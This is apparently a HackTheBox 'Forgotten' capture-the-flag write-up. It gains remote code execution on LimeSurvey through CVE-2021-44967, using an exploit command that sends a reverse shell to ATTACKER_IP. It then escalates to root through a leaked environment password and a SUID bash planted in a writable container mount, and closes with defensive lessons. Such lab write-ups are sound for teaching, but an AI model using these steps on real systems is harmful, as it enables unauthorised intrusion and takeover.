## Hello everyone!

Today, we will cover “*Forgotten*”, an easy-level machine from HackTheBox.

Without further ado, let’s get started!

![image](/HTB/Forgotten/Forgotten_images/1.png)

(ensure that you have added the following line  `TARGET_IP     forgotten.htb`  to your local `/etc/hosts` file in order to resolve the domain name of the target)

## Information Gathering

First, we will perform an aggressive **Nmap** scan to gather as much information as possible about the target:

![image](/HTB/Forgotten/Forgotten_images/2.png)

We can identify two exposed services:

**SSH** (OpenSSH 8.9p1 | 22)

**HTTP** (Apache httpd 2.4.56 (Debian) | 80)

Nmap Script Engine indicates that the root page of the website hosted on port 80 is forbidden (403). Let’s verify this by accessing it:

![image](/HTB/Forgotten/Forgotten_images/3.png)

Indeed, we cannot access it. We can use **Gobuster** to enumerate potential web directories we could access:

![image](/HTB/Forgotten/Forgotten_images/4.png)

We discover an accessible `/survey` directory:

![image](/HTB/Forgotten/Forgotten_images/5.png)

The directory hosts a *LimeSurvey* application installer suggesting that the CMS installation has not been completed. Let’s proceed:

![image](/HTB/Forgotten/Forgotten_images/6.png)

The installation process reveals us useful information concerning the application: we are configuring the LimeSurvey **v6.3.7** installation, which sets up a **MySQL** database locally. Since the installer allows remote database configuration, we can trick the application into using a database we control. Let’s point the database to our Kali IP after spinning up a MySQL container.

We will setup a MySQL container with the below command:

```
podman run -d \
  --name ctf-mysql \
  -e MYSQL_ROOT_PASSWORD=RootP@ssw0rd! \
  -e MYSQL_DATABASE=lime \
  -e MYSQL_USER=hacker \
  -e MYSQL_PASSWORD=hacker123 \
  -p 3306:3306 \
  -v mysql_data:/var/lib/mysql \
  docker.io/library/mysql:8.0
```

![image](/HTB/Forgotten/Forgotten_images/7.png)

![image](/HTB/Forgotten/Forgotten_images/8.png)

Set the admin’s password to the password of your choice. In my case, I chose to simply put *password* for the sake of simplicity:

![image](/HTB/Forgotten/Forgotten_images/9.png)

Once the installation process has completed, we can authenticate us via the administrator portal with the provided credentials:

![image](/HTB/Forgotten/Forgotten_images/10.png)




## Initial Access


Now that we have legitimate access to the web application, after performing some research on potential vulnerabilities affecting the current CMS version, which is 6.3.7 as identified earlier, we can identify the **CVE-2021-44967** vulnerability ****which leverages a plugin upload weakness implemented in the application to achieve an **Authenticated Remote Code Execution** (RCE). A Python script exploiting this vulnerability exists at this GitHub Repository. Let’s download and execute it with the `-h` switch to obtain more information about its usage:

![image](/HTB/Forgotten/Forgotten_images/11.png)

We need to provide the script with the target URL, a pair of valid credentials, our local IP and our listening port to catch the connection.

Since i chose the password *‘password’* for the **admin** user, the following command will be used:

`python3 CVE-2021_44967.py --url http://forgotten.htb/survey --user admin --password password --lhost ATTACKER_IP --lport NC_PORT`

(ensure that you have set up a netcat listener in order to receive back the reverse shell)

![image](/HTB/Forgotten/Forgotten_images/12.png)

We successfully obtained initial access on the machine as the user **limesvc**!

Although Python is not available, we can still spawn a pseudo-terminal using the `script` utility:

`script -qc /bin/bash /dev/null`

`export TERM=xterm`

We can start our local enumeration of the system by checking the `/etc/passwd` file to see whether there are other users present on the system we can leverage to pivot our obtained access:

![image](/HTB/Forgotten/Forgotten_images/13.png)

It seems that we are the only non-root user, which means that there is no need to perform horizontal privilege escalation. Can we already retrieve the first flag located in our `/home/limesvc` directory?

![image](/HTB/Forgotten/Forgotten_images/14.png)

Curiously, there is nothing, and there is no other users folder in the `/home` directory.

Moreover, the hostname seems to indicates us that we are into a container.

However, there is an interesting environment variable outputted by `env` command:

![image](/HTB/Forgotten/Forgotten_images/15.png)

We can identify a password in cleartext in the `LIMESURVEY_PASS` variable, which suggests that this password could correspond to our current user. We can now use it using `sudo -l` to list potential elevated command we could execute in the container:

![image](/HTB/Forgotten/Forgotten_images/16.png)

It looks like we are able to run any command with **root privileges**, we can simply run `sudo su` to elevate our privilege to **root** in the container, which could be useful for later:

![image](/HTB/Forgotten/Forgotten_images/17.png)

We may need to escape the restricted environment, let’s authenticate us again as **limesvc** but this time via **SSH** with the valid password we found to see whether we can access something else:

![image](/HTB/Forgotten/Forgotten_images/18.png)

We can see that the hostname has been replaced by *forgotten*, which seems to be the real target system. 

We can now list our current directory and retrieve the user flag:

![image](/HTB/Forgotten/Forgotten_images/19.png)



## Privilege Escalation


We now need to escalate our current privileges to **root** in order to retrieve the final flag. Since we got a valid password for our current user, we can start our privilege escalation vectors enumeration by running `sudo -l` to see whether we are able to run any command on the system with **root privileges**:

![image](/HTB/Forgotten/Forgotten_images/20.png)

It seems that we can’t do this. However, if we remember, we elevated our privileges in a Docker container previously. Can we create some file in this container as root that are reachable from the host ?

Based on identical file structures, we suspect that the directory is mounted on the host as the file structure on the both environments is identical. Let’s verify this by creating a simple text file:

![image](/HTB/Forgotten/Forgotten_images/21.png)

![image](/HTB/Forgotten/Forgotten_images/22.png)

As we can see, the file we created in the container as **root** in the `/var/www/html/survey` directory is located in the `/opt/limesurvey` directory on the host machine! Since the file keeps its permissions, we can copy the `/bin/bash` binary in the directory and add to it the SUID bit set:

![image](/HTB/Forgotten/Forgotten_images/23.png)

Once the binary generated, we can get back to the host machine and execute it to escalate our privilege outside of the container:

![image](/HTB/Forgotten/Forgotten_images/24.png)

It works! We successfully elevated our privileges by leveraging a compromised container. We can now navigate to the `/root` directory and retrieve the final flag:

![image](/HTB/Forgotten/Forgotten_images/25.png)

Challenge completed!

![image](/HTB/Forgotten/Forgotten_images/26.png)

## Conclusion

This machine highlights a realistic and impactful chain of misconfigurations leading to full system compromise.

We began by exploiting an exposed and unfinished installation of LimeSurvey, which allowed authenticated access and ultimately remote code execution through a known vulnerability (**CVE-2021-44967**). This step underscores the risk of leaving setup interfaces publicly accessible.

Next, poor credential management played a key role. Sensitive information stored in environment variables provided an easy path to privilege escalation within the container, demonstrating how critical it is to properly secure secrets.

The most significant takeaway comes from the container escape. A host directory mounted with write permissions (`/opt/limesurvey`) enabled us, as root inside the container, to plant a **SUID binary** and escalate privileges on the host system. This clearly illustrates that containers are not a security boundary by default, and **improper isolation** can completely undermine the host.

Overall, *Forgotten* emphasizes three fundamental security lessons:

- secure application deployment,
- proper handling of credentials,
- and strict container isolation.

A straightforward yet highly representative challenge of real-world attack paths.
